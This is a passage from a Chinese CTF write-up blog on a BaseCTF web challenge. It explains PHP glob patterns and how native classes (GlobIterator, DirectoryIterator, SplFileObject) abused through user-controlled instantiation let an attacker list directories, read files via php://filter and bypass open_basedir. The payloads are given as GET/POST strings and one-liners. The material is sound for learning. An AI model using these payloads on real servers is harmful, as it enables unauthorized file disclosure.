style="color:rgb(77, 77, 77);">$filename:它是必填参数。它指定要显示其内容的文件。</font></p><p><font style="color:rgb(77, 77, 77);">$return:它是可选的布尔值参数。其默认值为FALSE。如果将其设置为TRUE，则该函数将以字符串形式返回突出显示的代码，而不是将其打印出来。</font></p><p><font style="color:rgb(77, 77, 77);">返回值：成功返回TRUE，失败返回FALSE。如果$return设置为TRUE，它将以字符串形式返回突出显示的代码。</font></p><p><font style="color:rgb(77, 77, 77);">(本题中的highlight_file()函数被用与配合glob输出flag)</font></p><h4 id="PHP-Glob（）函数以示例匹配路径，目录，文件名"><a href="#PHP-Glob（）函数以示例匹配路径，目录，文件名" class="headerlink" title="PHP Glob（）函数以示例匹配路径，目录，文件名"></a><font style="color:rgb(34, 34, 38);">PHP Glob（）函数以示例匹配路径，目录，文件名</font></h4><p>参考文章<a href="https://blog.csdn.net/cunjiu9486/article/details/109076435?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522E8CADAC9-A8BF-4686-A4EC-DB0D4EDE2F03%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=E8CADAC9-A8BF-4686-A4EC-DB0D4EDE2F03&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-109076435-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=glob%E5%87%BD%E6%95%B0php&spm=1018.2226.3001.4187">链接</a></p><h6 id="确切的字符串搜索-Exact-String-Search"><a href="#确切的字符串搜索-Exact-String-Search" class="headerlink" title="确切的字符串搜索 (Exact String Search)"></a><font style="color:rgb(79, 79, 79);">确切的字符串搜索 (Exact String Search)</font></h6><p><font style="color:rgb(77, 77, 77);">我们将从一个简单的例子开始。 我们将研究如何将精确的字符串或文件名与绝对路径匹配。 在此示例中，我们将列出文件 &#x2F;home&#x2F;ismail&#x2F;poftut.c。 我们可以在下面的示例中看到该函数返回一个包含匹配项的列表</font><font style="color:rgb(77, 77, 77);">。</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/home/ismail/poftut.c&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>)&#123; <br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>\n&quot;</span>; <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742389495-c9882832-2a1e-4150-b09c-cf6dd8276dba.png"></p><h6 id="通配符-Wildcards"><a href="#通配符-Wildcards" class="headerlink" title="通配符(Wildcards)"></a><font style="color:rgb(79, 79, 79);">通配符(Wildcards)</font></h6><p><font style="color:rgb(77, 77, 77);">通配符对于glob操作很重要。 通配符或星号用于匹配零个或多个字符。 通配符指定在字符不重要的情况下可以有零个字符或多个字符。 在本示例中，我们将匹配扩展名为.txt文件。</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/home/ismail/*.txt&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>)&#123; <br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>\n&quot;</span>; <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742443588-44981182-2b93-4581-ab74-ceb3e2e43518.png"></p><p><font style="color:rgb(77, 77, 77);">我们可以看到，有许多.txt文件返回到PHP列表中。</font></p><h6 id="具有多级目录的通配符-Wildcards-with-Multilevel-Directories"><a href="#具有多级目录的通配符-Wildcards-with-Multilevel-Directories" class="headerlink" title="具有多级目录的通配符 (Wildcards with Multilevel Directories)"></a><font style="color:rgb(79, 79, 79);">具有多级目录的通配符 (Wildcards with Multilevel Directories)</font></h6><p><font style="color:rgb(77, 77, 77);">我们可以使用通配符来指定多级目录。 如果要在一级目录中搜索指定的glob，则将使用</font><font style="color:#601BDE;">&#x2F;*&#x2F;</font><font style="color:rgb(77, 77, 77);"> 。 在此示例中，我们在 &#x2F;home&#x2F;ismail下一级目录中搜索.txt文件</font><font style="color:rgb(77, 77, 77);">。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742560833-b2c82f4a-d811-4dac-9289-0cf0a940e466.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/home/ismail/*/*.txt&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>)&#123; <br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>\n&quot;</span>; <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h6 id="单字符-Single-Character"><a href="#单字符-Single-Character" class="headerlink" title="单字符 (Single Character)"></a><font style="color:rgb(79, 79, 79);">单字符 (Single Character)</font></h6><p><font style="color:rgb(77, 77, 77);">有一个问号，用于匹配单个字符。 如果我们不知道给定名称的单个字符，这将很有用。 在此示例中，我们将文件与文件file?.txt文件匹配，这些文件将匹配</font></p><p><font style="color:rgb(51, 51, 51);">file1.txt file.txt file5.txt</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/home/ismail/*/*.?&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>)&#123; <br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>\n&quot;</span>; <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742779958-07f03ca6-65ff-40c9-b8e6-65271ea726a8.png"></p><h6 id="多个字符-Multiple-Characters"><a href="#多个字符-Multiple-Characters" class="headerlink" title="多个字符(Multiple Characters)"></a><font style="color:rgb(79, 79, 79);">多个字符(Multiple Characters)</font></h6><p><font style="color:rgb(77, 77, 77);">Glob还支持字母和数字字符。 我们可以使用 [ 来开始字符范围，而 ] 来结束字符范围。 我们可以将要匹配的任何内容放在方括号之间。 在此示例中，我们将匹配以e,m,p之一开头的文件和文件夹名称。</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/home/ismail/[emp]*.tx?&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>)&#123; <br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>\n&quot;</span>; <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742818406-3a9a03ca-8334-48c9-91dd-c194edd4dc0c.png"></p><h6 id="编号范围-Number-Ranges"><a href="#编号范围-Number-Ranges" class="headerlink" title="编号范围(Number Ranges)"></a><font style="color:rgb(79, 79, 79);">编号范围(Number Ranges)</font></h6><p><font style="color:rgb(77, 77, 77);">在某些情况下，我们可能希望匹配数字范围。 我们可以使用 - 破折号指定开始和结束编号。 在此示例中，我们将0到9与0-9匹配。 在此示例中，我们将匹配文件和文件夹名称，其中包含从0到9的数字。</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/home/ismail/*[0-9]*&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>)&#123; <br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>\n&quot;</span>; <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742924540-9d365209-04b3-4431-b927-f5fc7c164483.png"></p><h6 id="字母范围-Alphabet-Ranges"><a href="#字母范围-Alphabet-Ranges" class="headerlink" title="字母范围(Alphabet Ranges)"></a><font style="color:rgb(79, 79, 79);">字母范围(Alphabet Ranges)</font></h6><p><font style="color:rgb(77, 77, 77);">我们还可以定义类似于数字范围的字母范围。 我们将az用于小写字符，将AZ用于大写字符。 如果我们需要在单个语句中匹配大小写字符，该怎么办。 我们可以使用aZ来匹配大小写字母。 在此示例中，我们将匹配以a和c之间a字母开头的文件和文件夹名称</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/home/ismail/[a-c]*&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>)&#123; <br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>\n&quot;</span>; <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742991386-bf8fa900-f045-4993-a023-39f50401936b.png"></p><h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><h2 id="flag直接读取不就行了？"><a href="#flag直接读取不就行了？" class="headerlink" title="flag直接读取不就行了？"></a>flag直接读取不就行了？</h2><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$J1ng</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br><span class="hljs-variable">$Hong</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;H&#x27;</span>];<br><span class="hljs-variable">$Keng</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;K&#x27;</span>];<br><span class="hljs-variable">$Wang</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;W&#x27;</span>];<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$Keng</span>(<span class="hljs-variable">$Wang</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$J1ng</span>(<span class="hljs-variable">$Hong</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>刚开始只知道是有关php的题目 看来wp也没怎么看懂 后面在csdn上看到了一篇十分相像的文章才知道考的是<font style="color:#601BDE;">php的原生类遍历目录和读取文件</font></p><p><font style="color:#000000;">参考文章</font><a href="https://blog.csdn.net/Elite__zhb/article/details/129739647"><font style="color:#000000;">链</font><font style="color:#601BDE;">接</font></a></p><p><font style="color:rgb(77, 77, 77);">当php代码只有一个类或者没有类利用时，我们就可以调用php的内置类来进行目录遍历和任意文件读取等一系列的操作。内置类，顾名思义就是php本身存在的类，我们可以直接拿过来用。本次来学习经常能用到的几种内置类。</font></p><p><font style="color:#000000;">由于我们可以控制参数$Keng和$Wang 且根据提示flag在文件secret里面</font></p><p><font style="color:#000000;">所以利用</font><font style="color:rgb(77, 77, 77);">目录遍历的三种内置类</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">DirectoryIterator</span> (PHP <span class="hljs-number">5</span>, PHP <span class="hljs-number">7</span>, PHP <span class="hljs-number">8</span>)<br> <br><span class="hljs-built_in">FilesystemIterator</span> (PHP <span class="hljs-number">5</span> &gt;= <span class="hljs-number">5.3</span>.<span class="hljs-number">0</span>, PHP <span class="hljs-number">7</span>, PHP <span class="hljs-number">8</span>)<br> <br><span class="hljs-built_in">GlobIterator</span> <br></code></pre></td></tr></table></figure><p>于是先遍历secret目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GET:<br>?K=<span class="hljs-built_in">GlobIterator</span>&amp;W=glob:<span class="hljs-comment">///secret/*</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731767823056-02f1ba5b-a2e7-45ce-86d5-a4ec70020a18.png"></p><p>发现secret下存在f11444g.php(很明显是flag) 所以我们需要读取文件类来输出flag</p><p>利用SpIFileObject类和php:&#x2F;&#x2F;fillter来传输flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">POST:<br>J=<span class="hljs-built_in">SplFileObject</span>&amp;H=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=/secret/f11444g.php</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731768286245-e004de03-fbf8-4111-9901-67736fa7e6ac.png"></p><p>获得flag的base64加密 最后把密文进行解密就可得到flag</p><h3 id="关于题目中php原生类的利用"><a href="#关于题目中php原生类的利用" class="headerlink" title="关于题目中php原生类的利用"></a>关于题目中php原生类的利用</h3><p>参考文章<a href="https://blog.csdn.net/qq_44640313/article/details/134310900?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522CEB32147-96E0-4F63-95A4-9EDA041D3E62%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=CEB32147-96E0-4F63-95A4-9EDA041D3E62&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-134310900-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB&spm=1018.2226.3001.4187">链接</a></p><h4 id="可遍历目录类"><a href="#可遍历目录类" class="headerlink" title="可遍历目录类"></a><font style="color:rgb(79, 79, 79);">可遍历目录类</font></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">可遍历目录类分为下面三个：<br><br><span class="hljs-built_in">DirectoryIterator</span> 类<br><span class="hljs-built_in">FilesystemIterator</span> 类<br><span class="hljs-built_in">GlobIterator</span> 类<br></code></pre></td></tr></table></figure><h5 id="DirectoryIterator-类"><a href="#DirectoryIterator-类" class="headerlink" title="DirectoryIterator 类 "></a><font style="color:rgb(79, 79, 79);">DirectoryIterator 类 </font></h5><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名</p><p>功能:遍历指定目录里的文件, 可以配合glob:&#x2F;&#x2F;协议使用匹配来寻找文件路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731768831222-d2225999-cdbb-41e8-8772-9553e5e12cfa.png"></p><p><font style="color:rgb(77, 77, 77);">这个查不出来什么，如果想输出全部的文件名需要对$dir对象进行</font><strong><font style="color:rgb(77, 77, 77);">遍历，</font></strong><font style="color:rgb(77, 77, 77);">遍历全部文件</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>    <span class="hljs-comment">//echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;); //与上句效果一样</span><br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">所以说echo触发了</font><strong><font style="color:rgb(77, 77, 77);">Directorylterator</font></strong><font style="color:rgb(77, 77, 77);"> 中的</font><strong><font style="color:rgb(77, 77, 77);">__toString()</font></strong><font style="color:rgb(77, 77, 77);">方法</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731768911274-0b18527d-acaf-47e0-ba05-f5765e6c82e7.png"></p><p><font style="color:rgb(77, 77, 77);">还可以配合</font><strong><font style="color:rgb(77, 77, 77);">glob:&#x2F;&#x2F;协议</font></strong><font style="color:rgb(77, 77, 77);">使用</font><strong><font style="color:rgb(77, 77, 77);">模式匹配</font></strong><font style="color:rgb(77, 77, 77);">来寻找我们想要的</font><strong><font style="color:rgb(77, 77, 77);">文件路径</font></strong><font style="color:rgb(77, 77, 77);">：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731768930550-ff389e7d-55d2-4af0-84e7-fee657111ef9.png"></p><p><font style="color:rgb(77, 77, 77);">也可以目录穿越，确定已知的文件的</font><strong><font style="color:rgb(77, 77, 77);">具体路径</font></strong><font style="color:rgb(77, 77, 77);">：</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob://./././flag&quot;</span>);  <span class="hljs-comment">//目录穿越</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><h5 id="FilesystemIterator类"><a href="#FilesystemIterator类" class="headerlink" title="FilesystemIterator类"></a><strong><font style="color:rgb(79, 79, 79);">FilesystemIterator类</font></strong></h5><p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p><p>该类的使用方法与DirectoryIterator 类也是基本相同的(子类与父类的关系)，就不细讲了</p><h5 id="GlobIterator-类"><a href="#GlobIterator-类" class="headerlink" title="GlobIterator 类"></a><font style="color:rgb(79, 79, 79);">GlobIterator 类</font></h5><p>GlobIterator 类也可以遍历一个文件目录，但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。但是使用这个类不需要额外写上glob:&#x2F;&#x2F;</p><p>它的特点就是，只需要知道部分名称就可以进行遍历</p><p> Directorylterator类 与 FilesystemIterator 类当我们使用echo函数输出的时候，会触发这两个类中的 __toString() 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的。而GlobIterator 类在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如：例题里我们知道了flag的文件名特征为 以fl开头的文件，因此我们可以通过 GlobIterator类来模式匹配：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&quot;/fl*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><h5 id="绕过-open-basedir"><a href="#绕过-open-basedir" class="headerlink" title="绕过 open_basedir"></a><font style="color:rgb(79, 79, 79);">绕过 open_basedir</font></h5><h6 id="open-basedir简介"><a href="#open-basedir简介" class="headerlink" title="open_basedir简介"></a><font style="color:rgb(79, 79, 79);">open_basedir简介</font></h6><p>Open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。</p><h6 id="利用DirectoryIterator-Glob-直接列举目录"><a href="#利用DirectoryIterator-Glob-直接列举目录" class="headerlink" title="利用DirectoryIterator + Glob 直接列举目录"></a><font style="color:rgb(79, 79, 79);">利用DirectoryIterator + Glob 直接列举目录</font></h6><p>题目中用的就是这种方法</p><p>再举个别的例子</p><p>代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;7&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment"># payload一句话的形式:</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">利用payload</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?<span class="hljs-number">7</span>=glob:<span class="hljs-comment">///*      #列出根目录下所有文件</span><br></code></pre></td></tr></table></figure><h6 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a><font style="color:rgb(79, 79, 79);">FilesystemIterator</font></h6><p><font style="color:rgb(77, 77, 77);">与上面基本一致，不再过多讨论</font></p><h6 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><font style="color:rgb(79, 79, 79);">GlobIterator</font></h6><p><strong><font style="color:rgb(77, 77, 77);">根据该类特点，</font></strong><font style="color:rgb(77, 77, 77);"> 不用在配合glob:&#x2F;&#x2F;协议</font></p><p><font style="color:rgb(77, 77, 77);">一句话payload</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&quot;/*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure><h4 id="可读取文件类"><a href="#可读取文件类" class="headerlink" title="可读取文件类"></a><font style="color:rgb(79, 79, 79);">可读取文件类</font></h4><h5 id="SplFileObject-类"><a href="#SplFileObject-类" class="headerlink" title="SplFileObject 类"></a><font style="color:rgb(79, 79, 79);">SplFileObject 类</font></h5><p><font style="color:rgb(77, 77, 77);">SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等</font></p><p><strong><font style="color:rgb(77, 77, 77);">原理</font></strong></p><p><font style="color:rgb(77, 77, 77);">该类的构造方法可以构造一个新的文件对象用于后续的读取。其大致原理可简单解释一下，当类中</font><font style="color:#601BDE;">__tostring</font><font style="color:rgb(77, 77, 77);">魔术方法被触发时，如果类中内容为存在文件名，那么它会对此文件名进行内容获取。</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">这样只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$tmp</span>)&#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$tmp</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BaseCTF(WEB方向)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>本站搭建过程</title>
    <link href="/2024/11/04/%E6%9C%AC%E7%AB%99%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/"/>
    <url>/2024/11/04/%E6%9C%AC%E7%AB%99%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/</url>
    
